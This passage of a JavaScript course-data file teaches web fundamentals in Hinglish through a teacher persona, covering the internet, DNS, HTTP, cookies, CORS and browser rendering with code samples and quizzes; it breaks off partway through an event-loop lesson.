export const webfundamentalsCourse = {
  id: 'web-fundamentals',
  title: 'Web Fundamentals',
  description: 'Internet kaise chalta hai, browser website kaise render karta hai, HTTP/2/3, DNS, Storage, Web Security, WebSockets, CDN Edge aur FAANG Interview Architecture — Masti Sir ke saath seekho!',
  icon: '🌐',
  category: 'frontend',
  certificateName: 'WEB FUNDAMENTALS',
  topicsCount: 15,
  practiceCount: 25,
  projectsCount: 4,
  hoursEstimate: 12,
  level: 'Beginner to Advanced',
  chapters: [
    {
      chapterTitle: 'Chapter 1: How the Internet & Web Works',
      lessons: [
        {
          id: 'wf-how-internet-works',
          title: 'How the Internet Works',
          emoji: '🌍',
          xpReward: 40,
          badgeName: 'Internet Explorer',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Internet koi jaadu nahi hai bhai! Ye billions of computers ka aapas mein connected ek giant network hai. Chalo dekhein packets kaise travel karte hain!"',
            hint: '💡 Masti Sir: "Socho internet ek global post office hai jahan har device ka ek unique address (IP) hota hai."',
            success: '🎉 Masti Sir: "Shabash! Ab tum jaante ho ki jab tum enter dabate ho toh taaron aur radio waves mein kya toofan machhta hai!"',
            mistake: '😅 Masti Sir: "Internet aur Web ko ek mat samjho — Internet road network hai, Web uspe chalne wali gaadiyan!"'
          },
          englishDef: 'The Internet is a global network of interconnected computers communicating via standardized protocols (TCP/IP). The World Wide Web (WWW) is an information system operating on top of the internet using HTTP.',
          hinglishExplain: 'Internet aapas mein jude hue lakho-crore computers ka network hai jo optical fiber cables, satellites aur routers ke zariye data bhejte hain. Jab aap kisi website pe click karte ho, toh data chhote-chhote packets mein toot kar destination tak pahunchta hai.',
          storyExplain: 'Socho tum Delhi mein ho aur tumhara dost Mumbai mein. Tum usko 1000 pages ki kitaab bhejna chahte ho. Post office saare pages ko 10 alag-alag lifafon (packets) mein pack karta hai. Har lifafe pe "To Address" aur "From Address" (IP Address) hota hai. Kuch packets train se jaate hain, kuch flight se. Mumbai pahunch kar saare lifafe sequence number ke hisab se wapas book ban jaate hain! Yehi TCP/IP aur Internet hai.',
          funnyExample: {
            scenario: 'Tumne crush ko "Hi" bheja WhatsApp pe. Wo message underwater sea cables se hote hue data center gaya aur phir uske phone pe ring hua!',
            punchline: 'Dilon ki doori bhale ho, submarine optical fiber cables ne sabko 50ms mein connect kar rakha hai! 😂'
          },
          memoryTrick: 'IP Address = Ghar ka Pata 🏠\nRouter = Traffic Police 👮\nPackets = Parcel ke Tukde 📦\nTCP = Delivery Guarantee Inspector ✅',
          visualDiagram: {
            title: 'Internet Packet Flow',
            nodes: ['Your Browser (Client)', 'WiFi Router', 'ISP (Internet Service Provider)', 'Optical Fiber Cables', 'Target Server'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Data Journey from Click to Screen',
            steps: ['Browser sends request', 'OS breaks data into IP Packets', 'Router routes packets via BGP', 'Destination server receives & reassembles', 'Server sends Response Packets']
          },
          code: `// Simulating Client-Server Packet Ping
async function checkNetworkLatency(url) {
  const startTime = performance.now();
  try {
    const response = await fetch(url, { method: 'HEAD' });
    const endTime = performance.now();
    const pingMs = (endTime - startTime).toFixed(2);
    console.log(\`✅ Connected to \${url}\`);
    console.log(\`⚡ Round-trip latency (Ping): \${pingMs}ms\`);
    console.log(\`📦 Status Code: \${response.status}\`);
  } catch (err) {
    console.error('❌ Connection Failed:', err.message);
  }
}

checkNetworkLatency('https://api.github.com');`,
          codeBreakdown: [
            { part: 'performance.now()', label: 'High precision timestamp in milliseconds', color: '#3b82f6' },
            { part: 'fetch(url, { method: "HEAD" })', label: 'Sirf headers maangta hai bina body download kiye — super fast latency check', color: '#10b981' },
            { part: 'Round-trip latency', label: 'Data jane aur aane ka total time (RTT)', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Internet aur World Wide Web (WWW) ko same samajhna (Internet is infrastructure, Web is service)',
            '❌ Ye sochna ki saara internet wireless satellite se chalta hai (99% international traffic submarine ocean cables se chalta hai!)',
            '❌ IP Address aur MAC Address mein confuse hona'
          ],
          proTips: [
            '💡 Ping time < 50ms is excellent for web apps, > 200ms feels laggy',
            '💡 Use Chrome DevTools > Network tab to inspect TTFB (Time to First Byte)'
          ],
          interviewQuestions: [
            'What happens under the hood from the physical layer to application layer when you load a webpage?',
            'What is the difference between TCP and UDP?',
            'What is the difference between IPv4 and IPv6?'
          ],
          miniChallenge: 'Network tab open karo DevTools mein, koi bhi site reload karo aur dekho kitne packets aur requests fire hoti hain!',
          quiz: {
            type: 'mcq',
            question: 'TCP protocol ka sabse bada benefit kya hai?',
            options: ['Super fast video streaming', 'Reliable, in-order packet delivery with error checking', 'Wireless transmission', 'Automatic domain naming'],
            answer: 'Reliable, in-order packet delivery with error checking',
            explanation: 'TCP ensures handshake, packet ordering, and retransmission if any packet gets lost.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'Fill in the blank:',
              sentence: 'Data internet par chhote units mein travel karta hai jinhe ___ kehte hain.',
              answer: 'packets',
              explanation: 'Packets are small chunks of formatted data.'
            }
          ],
          summary: ['Internet global network of networks hai', 'Data packets mein toot kar IP & TCP protocols ke through travel karta hai', 'Latency aur bandwidth website speed decide karte hain'],
          flashcard: { q: 'What is TCP 3-Way Handshake?', a: 'SYN -> SYN-ACK -> ACK: Connection establish karne ka 3-step process.' },
          funFact: '🦈 Sharks actually bite undersea fiber optic internet cables sometimes!',
          didYouKnow: 'Vint Cerf and Bob Kahn are recognized as the fathers of the Internet for creating TCP/IP protocols in the 1970s.',
          realWorldUseCases: ['Web browsing', 'Video calling', 'Cloud gaming', 'Financial trading'],
          practiceQuestions: [
            'Terminal mein `ping google.com` run karke average round trip time dekho',
            'DNS lookup command `nslookup` run karke IP find karo'
          ]
        },
        {
          id: 'wf-client-server-dns',
          title: 'Client-Server Architecture & DNS',
          emoji: '📡',
          xpReward: 40,
          badgeName: 'DNS Navigator',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "Tum browser mein `codemasti.com` likhte ho aur computer ko 104.21.55.2 samjh aata hai! Beech ka translator DNS hai!"',
            hint: '💡 Masti Sir: "DNS internet ki phonebook hai — naam do, number (IP) lo!"',
            success: '🎉 Masti Sir: "Arey waah! Ab tumhe client-server ka handshake aur DNS tree hierarchy samajh aa gayi!"',
            mistake: '😅 Masti Sir: "DNS cache bhool gaye? Isliye IP change karne ke baad bhi purana page dikhta hai!"'
          },
          englishDef: 'The Client-Server architecture divides tasks between service requesters (clients like browsers) and service providers (servers). DNS (Domain Name System) translates human-readable domain names into machine IP addresses.',
          hinglishExplain: 'Client woh hai jo request bhejta hai (jaise aapka browser ya mobile app). Server woh powerful computer hai jo 24/7 on rehta hai aur response bhejta hai. DNS internet ki contact list hai jo naam (codemasti.com) ko IP address (192.0.2.1) mein convert karti hai.',
          storyExplain: 'Socho tum Zomato pe pizza order kar rahe ho. Tumhara phone = Client. Pizza Restaurant ki kitchen = Server. Delivery boy = HTTP request/response. Par restaurant ka address dhoondne ke liye tum Google Maps (DNS) use karte ho! Pehle maps se address nikalte ho, phir order bhejte ho.',
          funnyExample: {
            scenario: 'Agar DNS na hota, toh tumhe Insta chalane ke liye yaad rakhna padta: "Bhai 157.240.22.35 open kar na, nayi reel aayi hai!" 😂',
            punchline: 'DNS humans ko number ratne se bachata hai!'
          },
          memoryTrick: 'DNS Steps:\n1. Browser Cache\n2. OS Cache\n3. Resolver (ISP)\n4. Root Server (.)\n5. TLD Server (.com)\n6. Authoritative Name Server',
          visualDiagram: {
            title: 'DNS Resolution Lifecycle',
            nodes: ['Browser asks: "IP of codemasti.com?"', 'ISP Recursive Resolver', 'Root DNS Server', '.com TLD Server', 'Authoritative DNS Server', 'IP returned: 104.21.5.2'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'What happens when you type a URL?',
            steps: ['DNS lookup resolves domain to IP', 'TCP 3-way handshake with server', 'TLS/SSL handshake for HTTPS', 'Browser sends HTTP GET request', 'Server processes and sends HTML response']
          },
          code: `// Node.js DNS lookup demonstration
const dns = require('dns').promises;

async function lookupWebsite(domain) {
  try {
    console.log(\`🔍 Looking up DNS records for: \${domain}\`);
    const address = await dns.lookup(domain);
    console.log(\`📍 A Record (IP): \${address.address} (Family: IPv\${address.family})\`);

    const mxRecords = await dns.resolveMx(domain).catch(() => []);
    console.log('📧 Mail (MX) Servers:', mxRecords.map(m => m.exchange));
  } catch (err) {
    console.error('❌ DNS Lookup Error:', err.message);
  }
}

lookupWebsite('github.com');`,
          codeBreakdown: [
            { part: 'dns.lookup()', label: 'Resolves hostname to IP via OS resolver', color: '#3b82f6' },
            { part: 'A Record', label: 'Maps domain name directly to IPv4 address', color: '#10b981' },
            { part: 'MX Record', label: 'Mail Exchanger record — batata hai emails kis mail server pe jane chahiye', color: '#8b5cf6' }
          ],
          commonMistakes: [
            '❌ Thinking DNS propagation happens instantly everywhere (TTL - Time to Live can take hours to expire)',
            '❌ Forgetting CNAME vs A Record differences (A points to IP, CNAME points to another domain)'
          ],
          proTips: [
            '💡 Use Cloudflare 1.1.1.1 or Google 8.8.8.8 for super-fast public DNS resolution',
            '💡 Flush local DNS cache with \`ipconfig /flushdns\` (Windows) or \`sudo dscacheutil -flushcache\` (Mac)'
          ],
          interviewQuestions: [
            'Explain the entire flow of what happens when you type google.com into your browser and press Enter.',
            'What is DNS TTL (Time To Live) and how does DNS caching work at multiple levels?',
            'What is the difference between Authoritative DNS and Recursive DNS?'
          ],
          miniChallenge: 'Open your terminal and run \`nslookup wikipedia.org\` or \`dig wikipedia.org\` to see its authoritative answer.',
          quiz: {
            type: 'mcq',
            question: 'Which DNS record maps a domain name directly to an IPv4 address?',
            options: ['CNAME Record', 'A Record', 'AAAA Record', 'TXT Record'],
            answer: 'A Record',
            explanation: 'A Record maps hostname to IPv4, whereas AAAA maps to IPv6.'
          },
          miniQuiz: [
            {
              type: 'predict',
              question: 'If you point \`blog.mysite.com\` to \`mysite.com\`, which DNS record type is used?',
              code: 'blog.mysite.com -> mysite.com',
              options: ['A Record', 'CNAME Record', 'MX Record', 'PTR Record'],
              answer: 'CNAME Record',
              explanation: 'Canonical Name (CNAME) aliases one domain name to another domain name.'
            }
          ],
          summary: ['Client requests, Server delivers', 'DNS maps human readable domain names to machine IP addresses', 'DNS resolution traverses Root, TLD, and Authoritative servers'],
          flashcard: { q: 'What is an AAAA record?', a: 'A DNS record that maps a domain name to an IPv6 (128-bit) address.' },
          funFact: 'There are only 13 logical Root DNS server addresses in the entire world, maintained by organizations like ICANN and NASA (though mirrored by thousands of anycast instances)!',
          didYouKnow: 'The DNS system was invented in 1983 by Paul Mockapetris.',
          realWorldUseCases: ['Domain registration', 'Load balancing via Round-Robin DNS', 'Email routing (MX)', 'SSL verification (TXT)'],
          practiceQuestions: [
            'Create a free DNS record on Cloudflare or Vercel',
            'Inspect DNS latency using Google Chrome DevTools'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 2: HTTP, HTTPS & Request/Response Cycle',
      lessons: [
        {
          id: 'wf-http-https-methods',
          title: 'HTTP, HTTPS, Methods & Status Codes',
          emoji: '📨',
          xpReward: 45,
          badgeName: 'Protocol Master',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "HTTP web ki aam bhasha hai. GET, POST, PUT, DELETE — yeh 4 verbs seekh liye toh web dev ka 50% raasta saaf!"',
            hint: '💡 Masti Sir: "200 = Sab changa si! 404 = Dhundhte reh jaoge! 500 = Server ka fuse udd gaya!"',
            success: '🎉 Masti Sir: "Waah! Status codes ka logic dimag mein bilkul fit baith gaya!"',
            mistake: '😅 Masti Sir: "HTTP pe password bhejna matlab postcard pe ATM PIN likh kar bhejna! Hamesha HTTPS use karo!"'
          },
          englishDef: 'HTTP (Hypertext Transfer Protocol) is an application-layer protocol for transmitting hypermedia documents. HTTPS encrypts HTTP requests via TLS/SSL, providing privacy, data integrity, and authentication.',
          hinglishExplain: 'Jab browser server se baat karta hai, wo HTTP format mein request bhejta hai. Har request ka ek Method hota hai (GET, POST, PUT, DELETE) aur server ek Status Code wapas karta hai (2xx Success, 3xx Redirection, 4xx Client Error, 5xx Server Error). HTTPS iska encrypted version hai jisme koi beech mein data chura nahi sakta.',
          storyExplain: 'Socho tum bank jaate ho. Tum cash check karte ho (GET), naya account kholte ho (POST), address update karte ho (PUT/PATCH), ya account band karte ho (DELETE). Bank ka cashier tumhein token deta hai: "Token 200: Kaam ho gaya!", "Token 401: ID card kahan hai tumhara?", "Token 500: Server down hai lunch ke baad aana!"',
          funnyExample: {
            scenario: 'Tumne restaurant waiter ko bola: "Bhai menu dikhana" (GET request). Waiter bola: "Kitchen mein aag lag gayi hai sir!" (500 Internal Server Error) 😂',
            punchline: 'Client ki galti = 4xx, Server ki galti = 5xx!'
          },
          memoryTrick: 'Status Code Cheat Sheet:\n1xx: Hold on (Informational)\n2xx: Here you go! (Success)\n3xx: Go over there! (Redirect)\n4xx: YOU messed up! (Client Error)\n5xx: WE messed up! (Server Error)',
          visualDiagram: {
            title: 'HTTP Request-Response Pipeline',
            nodes: ['Client Browser', 'HTTP Request (Method + Headers + Body)', 'Web Server (Node/Nginx)', 'Database Query', 'HTTP Response (Status 200 + Data)'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Anatomy of an HTTP Message',
            steps: ['Request Line: GET /api/users HTTP/1.1', 'Request Headers: Authorization, User-Agent, Accept', 'Empty Line separator', 'Request Body: JSON payload (for POST/PUT)', 'Server processes & generates HTTP Response']
          },
          code: `// Fetch API with full HTTP headers and Status Code Handling
async function fetchUserDashboard(userId) {
  try {
    const res = await fetch(\`https://api.example.com/users/\${userId}\`, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'Authorization': 'Bearer sample_token_123'
      }
    });

    if (res.status === 200) {
      const data = await res.json();
      console.log('✅ Success 200 OK:', data);
    } else if (res.status === 401) {
      console.error('🔒 Error 401 Unauthorized: Please log in again.');
    } else if (res.status === 404) {
      console.warn('🔍 Error 404: User not found in database.');
    } else if (res.status >= 500) {
      console.error('💥 Error 500: Server exploded! Retry later.');
    }
  } catch (networkErr) {
    console.error('🚫 Offline / Network Failed:', networkErr.message);
  }
}`,
          codeBreakdown: [
            { part: 'method: "GET"', label: 'Specifies HTTP verb', color: '#3b82f6' },
            { part: 'headers: { Authorization }', label: 'Sends JWT token to authenticate identity', color: '#10b981' },
            { part: 'res.status === 200', label: 'Inspects HTTP response status code before parsing', color: '#f59e0b' }
          ],
          commonMistakes: [
            '❌ Using GET request to transmit sensitive passwords or perform database deletions',
            '❌ Forgetting that \`fetch()\` only rejects on network errors, NOT on 404 or 500 HTTP status codes!',
            '❌ Confusing PUT (full resource replace) with PATCH (partial resource update)'
          ],
          proTips: [
            '💡 Always check \`res.ok\` (true for 200-299) when working with the native \`fetch()\` API',
            '💡 Idempotent methods (GET, PUT, DELETE) can be safely retried without unintended side-effects'
          ],
          interviewQuestions: [
            'What is the difference between PUT and PATCH methods?',
            'What does Idempotency mean in REST and HTTP?',
            'Explain the TLS 1.3 Handshake in HTTPS.'
          ],
          miniChallenge: 'Open Chrome DevTools > Network tab, click any XHR/Fetch request and inspect Request Headers and Response Headers.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa HTTP method safe aur idempotent dono mana jata hai?',
            options: ['POST', 'DELETE', 'GET', 'PATCH'],
            answer: 'GET',
            explanation: 'GET is safe (does not alter server state) and idempotent (multiple identical calls produce same effect).'
          },
          miniQuiz: [
            {
              type: 'predict',
              question: 'Agar user ne galat password daala toh server kaunsa HTTP status code return karega?',
              options: ['400 Bad Request', '401 Unauthorized', '403 Forbidden', '404 Not Found'],
              answer: '401 Unauthorized',
              explanation: '401 indicates unauthenticated / invalid credentials.'
            }
          ],
          summary: ['HTTP methods define the action to be performed', 'Status codes summarize server results (2xx, 3xx, 4xx, 5xx)', 'HTTPS provides encryption, integrity, and authentication via TLS certificates'],
          flashcard: { q: 'What is the difference between 401 and 403?', a: '401 = You are not logged in (Unauthorized); 403 = You are logged in, but lack permission (Forbidden).' },
          funFact: 'Tim Berners-Lee wrote the first HTTP specification in 1989 on a NeXT computer at CERN.',
          didYouKnow: 'HTTP/1.1 was finalized in 1997, HTTP/2 in 2015, and HTTP/3 in 2022.',
          realWorldUseCases: ['RESTful APIs', 'E-commerce checkout', 'Authentication tokens', 'File uploads'],
          practiceQuestions: [
            'Test all status codes using httpbin.org/status/404',
            'Use Postman or Thunder Client to send GET and POST requests'
          ]
        },
        {
          id: 'wf-cookies-cache-cors',
          title: 'Headers, Cookies, Caching & CORS',
          emoji: '🍪',
          xpReward: 45,
          badgeName: 'Header Specialist',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "CORS error dekh ke 90% developers panic karte hain! Aaj iska jadd se ilaj karenge — headers ka post-mortem!"',
            hint: '💡 Masti Sir: "CORS browser ka security guard hai! Agar backend allow nahi karega toh browser frontend ko data nahi lene dega!"',
            success: '🎉 Masti Sir: "Arey kya baat! Cache-Control aur CORS ka darr hamesha ke liye khatam!"',
            mistake: '😅 Masti Sir: "JWT token normal cookie mein rakh diya? XSS attack se bachaane ke liye `HttpOnly; Secure; SameSite=Strict` lagao!"'
          },
          englishDef: 'HTTP Headers pass metadata between client and server. Cookies store stateful session data on the client. Caching reduces latency via Cache-Control headers, while CORS (Cross-Origin Resource Sharing) governs browser cross-domain access.',
          hinglishExplain: 'Headers request aur response ke sath extra info bhejte hain (jaise Content-Type, Authorization, Cache-Control). Cookies browser mein chhoti text files hoti hain jo login session yaad rakhti hain. CORS browser ka ek security feature hai jo ek domain ki website ko dusre domain ke API data ko churane se rokta hai jab tak backend allow na kare.',
          storyExplain: 'Socho tum ek private VIP club mein jaate ho. Tumhare haath pe ek VIP stamp lagti hai (Cookie/Session). Har gate pe security guard stamp check karta hai (Headers). Par agar tum pados wale doosre club mein bina permission ghusne ki koshish karoge toh guard bolega: "Access Denied by CORS Policy!"',
          funnyExample: {
            scenario: 'Frontend (localhost:3000) ne Backend (api.codemasti.com) se data maanga. Browser ne bola: "Ruko! Backend se poochna padega ki kya tum dost ho!" (OPTIONS Preflight Request) 😂',
            punchline: 'CORS error server pe nahi, browser ke andar block hota hai!'
          },
          memoryTrick: 'Cookie Security Triple Shield:\n1. HttpOnly (JavaScript cannot steal it)\n2. Secure (Transmitted only via HTTPS)\n3. SameSite=Strict/Lax (Protects against CSRF attacks)',
          visualDiagram: {
            title: 'CORS Preflight (OPTIONS) Cycle',
            nodes: ['Frontend (Origin A)', 'OPTIONS Preflight Request', 'Backend validates Origin & Headers', 'Access-Control-Allow-Origin: *', 'Actual GET/POST Data Request'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'How Cache-Control Speeds Up Websites',
            steps: ['Browser requests asset (logo.png)', 'Server sends: Cache-Control: public, max-age=31536000, immutable', 'Browser saves logo to disk cache', 'Next 1 year: Zero network requests, instant 0ms load!']
          },
          code: `// Express.js Backend CORS & Cookie Configuration
const express = require('express');
const cors = require('cors');
const app = express();

// 1. Configure CORS for frontend origin
app.use(cors({
  origin: 'https://codemasti.com',
  credentials: true, // Allows cookies in cross-origin requests
  methods: ['GET', 'POST', 'PUT', 'DELETE']
}));

// 2. Setting Secure HttpOnly Session Cookie
app.post('/api/login', (req, res) => {
  res.cookie('sessionToken', 'abc_secure_jwt_123', {
    httpOnly: true, // Prevents XSS cookie theft
    secure: true,   // Sends only over HTTPS
    sameSite: 'lax',// Protects against CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
  
  res.set('Cache-Control', 'no-store'); // Do not cache sensitive auth
  res.json({ message: 'Logged in successfully!' });
});`,
          codeBreakdown: [
            { part: 'origin: "https://codemasti.com"', label: 'Explicitly whitelists allowed frontend domain', color: '#3b82f6' },
            { part: 'httpOnly: true', label: 'Blocks document.cookie access in JS to prevent XSS theft', color: '#ef4444' },
            { part: 'Cache-Control: no-store', label: 'Tells browser and proxies never to store this response in cache', color: '#10b981' }
          ],
          commonMistakes: [
            '❌ Setting `Access-Control-Allow-Origin: *` while also setting `credentials: true` (Browser will reject this combination!)',
            '❌ Storing sensitive auth tokens in `localStorage` where any rogue XSS script can read them',
            '❌ Forgetting that preflight OPTIONS requests must return status 200/204 with CORS headers'
          ],
          proTips: [
            '💡 Use `Cache-Control: max-age=31536000, immutable` for versioned hashed assets (e.g. `main.a84d9f.js`)',
            '💡 Use `stale-while-revalidate` caching for content that needs instant rendering while updating in background'
          ],
          interviewQuestions: [
            'What is the difference between LocalStorage, SessionStorage, and HttpOnly Cookies?',
            'What triggers a CORS preflight OPTIONS request?',
            'Explain `stale-while-revalidate` in Cache-Control.'
          ],
          miniChallenge: 'Open DevTools Application tab > Cookies, inspect how Google or GitHub sets `HttpOnly` and `SameSite` flags.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsa cookie flag JavaScript ke `document.cookie` ko cookie read karne se block karta hai?',
            options: ['Secure', 'HttpOnly', 'SameSite', 'Path'],
            answer: 'HttpOnly',
            explanation: 'HttpOnly prevents client-side scripts from reading the cookie, mitigating XSS token theft.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'CORS Preflight request kaunse HTTP method se jaati hai?',
              sentence: 'Browser non-simple cross-origin request se pehle ___ method bhejta hai.',
              answer: 'OPTIONS',
              explanation: 'HTTP OPTIONS is used for preflight checks.'
            }
          ],
          summary: ['Cookies hold session tokens', 'Cache-Control headers save bandwidth and speed up page loads', 'CORS is a browser security policy configured on the backend server'],
          flashcard: { q: 'What triggers a CORS preflight request?', a: 'Non-simple requests: custom headers, methods other than GET/HEAD/POST, or Content-Types other than form/text.' },
          funFact: 'Lou Montulli invented browser cookies in 1994 while working at Netscape Communications!',
          didYouKnow: 'The origin is defined as the tuple: (Protocol, Host, Port). If any of these 3 differ, it is considered Cross-Origin.',
          realWorldUseCases: ['Authentication sessions', 'CDN edge caching', 'Microservices API security', 'Shopping cart persistence'],
          practiceQuestions: [
            'Inspect Application tab > Cookies in Chrome DevTools to see flags',
            'Configure CORS middleware in an Express server'
          ]
        }
      ]
    },
    {
      chapterTitle: 'Chapter 3: Browser Rendering & DOM Engine',
      lessons: [
        {
          id: 'wf-browser-rendering-pipeline',
          title: 'Browser Rendering Pipeline & DOM',
          emoji: '⚙️',
          xpReward: 45,
          badgeName: 'Rendering Guru',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "HTML file se screen pe pixels tak ka safar render pipeline kehlata hai! DOM + CSSOM = Render Tree! Chalo dekhte hain 60 FPS rendering ka secret!"',
            hint: '💡 Masti Sir: "Reflow (Layout) sabse mehenga operation hota hai. Transform aur Opacity use karo smooth 60fps animations ke liye!"',
            success: '🎉 Masti Sir: "Arey kya baat! Critical Rendering Path ka flow clear ho gaya!"',
            mistake: '😅 Masti Sir: "JS script tag head mein bina `defer` ya `async` ke lagane se HTML parsing block ho jaati hai!"'
          },
          englishDef: 'The Critical Rendering Path is the sequence of steps browsers take to convert HTML, CSS, and JS into actual pixels on the screen: DOM -> CSSOM -> Render Tree -> Layout (Reflow) -> Paint -> Composite.',
          hinglishExplain: 'Browser HTML ko padh ke DOM tree banata hai, CSS ko padh ke CSSOM banata hai. Phir dono ko jod kar Render Tree banta hai. Iske baad Layout step mein har element ka exact size aur position calculate hota hai, Paint mein colors/borders bante hain, aur GPU Compositing se screen pe 60 times per second frame draw hota hai.',
          storyExplain: 'Socho tum ek movie shoot kar rahe ho. HTML = Script (dialogues aur characters). CSS = Costume & Stage design. DOM + CSSOM = Final Scene Blueprint. Layout = Director batata hai actor kahan khada hoga. Paint = Makeup aur lightings. Composite = Camera record karke screen pe stream karta hai! Agar actor beech scene mein costume badalta hai (DOM manipulation), toh poora scene dobara rehearse karna padta hai (Reflow)! 🎬',
          funnyExample: {
            scenario: 'Agar tum JavaScript se loop mein `element.style.width` baar baar change karoge, toh browser bolega: "Bhai main pagal ho gaya layout calculate karte karte!" (Layout Thrashing) 😂',
            punchline: 'Layout is expensive, GPU compositing is free!'
          },
          memoryTrick: 'Rendering Pipeline Steps:\n1. DOM (HTML Tree)\n2. CSSOM (Style Tree)\n3. Render Tree (Visible Nodes)\n4. Layout / Reflow (Geometry: x, y, width, height)\n5. Paint (Colors, shadows)\n6. Composite (GPU Layers)',
          visualDiagram: {
            title: 'Critical Rendering Path',
            nodes: ['HTML Parser -> DOM', 'CSS Parser -> CSSOM', 'Render Tree', 'Layout Calculation', 'Paint to Pixels', 'GPU Composite'],
            type: 'flow'
          },
          browserBehindScene: {
            title: 'Script Parsing: Normal vs Async vs Defer',
            steps: ['Normal `<script>`: Blocks HTML parser completely while downloading and executing', '`<script async>`: Downloads in parallel, executes immediately when ready (unordered)', '`<script defer>`: Downloads in parallel, executes after HTML parsing is complete (ordered)']
          },
          code: `// Measuring Layout Thrashing vs Optimized Batching
// ❌ BAD: Forces synchronous reflow (Layout Thrashing)
function badResizeBoxes() {
  const boxes = document.querySelectorAll('.box');
  boxes.forEach(box => {
    // Read and Write interleaved forces multiple reflows!
    const currentWidth = box.offsetWidth; // READ (Forces layout calculation)
    box.style.width = (currentWidth + 10) + 'px'; // WRITE
  });
}

// ✅ GOOD: Fast Batch Read then Batch Write (1 Reflow)
function optimizedResizeBoxes() {
  const boxes = Array.from(document.querySelectorAll('.box'));
  // 1. Batch Reads
  const widths = boxes.map(b => b.offsetWidth);
  // 2. Batch Writes using requestAnimationFrame
  requestAnimationFrame(() => {
    boxes.forEach((box, i) => {
      box.style.width = (widths[i] + 10) + 'px';
    });
  });
}`,
          codeBreakdown: [
            { part: 'box.offsetWidth', label: 'Forces browser to execute synchronous layout if previous styles changed', color: '#ef4444' },
            { part: 'requestAnimationFrame()', label: 'Syncs updates directly with next screen refresh rate (usually 60Hz / 16.6ms)', color: '#10b981' },
            { part: 'Batch Read then Write', label: 'Prevents Layout Thrashing and keeps frames buttery smooth', color: '#3b82f6' }
          ],
          commonMistakes: [
            '❌ Placing heavy blocking script tags in `<head>` without `defer` or `async`',
            '❌ Triggering reflow in loops by reading properties like `offsetTop`, `scrollTop`, `clientWidth` after style changes',
            '❌ Animating `top`, `left`, `margin` instead of GPU-accelerated `transform` and `opacity`'
          ],
          proTips: [
            '💡 Always animate `transform: translate()` and `opacity` because they skip Layout and Paint steps directly to GPU Composite!',
            '💡 Use `<script type="module">` or `defer` to allow progressive HTML rendering'
          ],
          interviewQuestions: [
            'What is the difference between Reflow (Layout) and Repaint?',
            'What is the difference between `<script async>` and `<script defer>`?',
            'How do CSS Container Queries and Content-Visibility optimize browser rendering?'
          ],
          miniChallenge: 'Inspect Chrome DevTools > Performance tab, record 3 seconds of page scrolling and find Layout / Paint events.',
          quiz: {
            type: 'mcq',
            question: 'Kaunsi CSS properties animate karne par browser Layout aur Paint dono skip karke direct GPU Composite karta hai?',
            options: ['width and height', 'top and left', 'transform and opacity', 'margin and padding'],
            answer: 'transform and opacity',
            explanation: '`transform` and `opacity` are handled directly on the compositor thread on GPU without triggering costly CPU layout or repaints.'
          },
          miniQuiz: [
            {
              type: 'fillblank',
              question: 'Script attribute fill karo:',
              sentence: '`<script ___ src="app.js"></script>` HTML parsing ko block nahi karta aur DOM ready hone ke baad execute hota hai.',
              answer: 'defer',
              explanation: '`defer` scripts download in the background and execute in order after HTML parsing completes.'
            }
          ],
          summary: ['DOM + CSSOM = Render Tree', 'Reflow calculates geometry, Repaint draws pixels, Composite combines GPU layers', 'Async vs Defer scripts optimize page load speeds'],
          flashcard: { q: 'What causes Layout Thrashing?', a: 'Rapidly alternating between reading geometry (e.g. offsetWidth) and writing styles (e.g. style.width) in JavaScript.' },
          funFact: 'Modern phone screens refresh at 120Hz, meaning the browser has only 8.3 milliseconds to parse, layout, and paint each frame!',
          didYouKnow: 'V8 (Chrome), SpiderMonkey (Firefox), and JavaScriptCore (Safari) compile JavaScript into native machine code using JIT (Just-In-Time) compilation.',
          realWorldUseCases: ['Smooth 60/120fps UI animations', 'Core Web Vitals LCP/CLS optimization', 'Lazy loading heavy script bundles', 'Responsive layout rendering'],
          practiceQuestions: [
            'Test async vs defer performance impact on a heavy HTML page',
            'Use Chrome DevTools Rendering panel to toggle "Paint flashing"'
          ]
        },
        {
          id: 'wf-event-loop-microtasks',
          title: 'JavaScript Engine, Call Stack & Event Loop Under the Hood',
          emoji: '⚡',
          xpReward: 50,
          badgeName: 'Event Loop Wizard',
          mastirQuote: {
            start: '👨‍🏫 Masti Sir: "JavaScript single-threaded hai par async superpower kaise deti hai? Call Stack, Microtask Queue aur Macrotask Queue ka secret samjho!"',
            hint: '💡 Masti Sir: "Promises (Microtasks) hamesha setTimeout (Macrotasks) se pehle execute hote hain!"',
            success: '🎉 Masti Sir: "Tumne JS runtime ka dil samajh liya! Ab execution order kabhi galat nahi hoga!"',
            mistake: '😅 Masti Sir: "Heavy sync loop Call Stack pe chalaoge toh poora browser tab freeze ho jayega!"'
          },
          englishDef: 'The JavaScript Event Loop coordinates execution between the single-threaded Call Stack, Web APIs (timers, network, DOM), Microtask Queue (Promises, queueMicrotask), and Macrotask/Task Queue (setTimeout, setInterval, I/O).',
          hinglishExplain: 'JavaScript ek time pe ek hi line execute kar sakti hai (Call Stack). Jab koi async task aata hai (jaise setTimeout ya fetch), browser use background Web API ko de deta hai. Jab wo ready hota hai, toh Promises Microtask Queue mein aate hain aur setTimeout Task Queue mein. Event loop pehle saare Microtasks khatam karta hai, phir agla Task uthata hai.',
          storyExplain: 'Bank ka counter socho. Cashier (Call Stack) ek time pe ek customer handle karta hai. Normal line (Task Queue) mein log khade hain. Lekin VIP counter (Microtask Queue) ke log normal line se pehle attend hote hain! Jab tak VIP line poori khaali nahi hoti, normal customer ka number nahi aata.',
          funnyExample: {
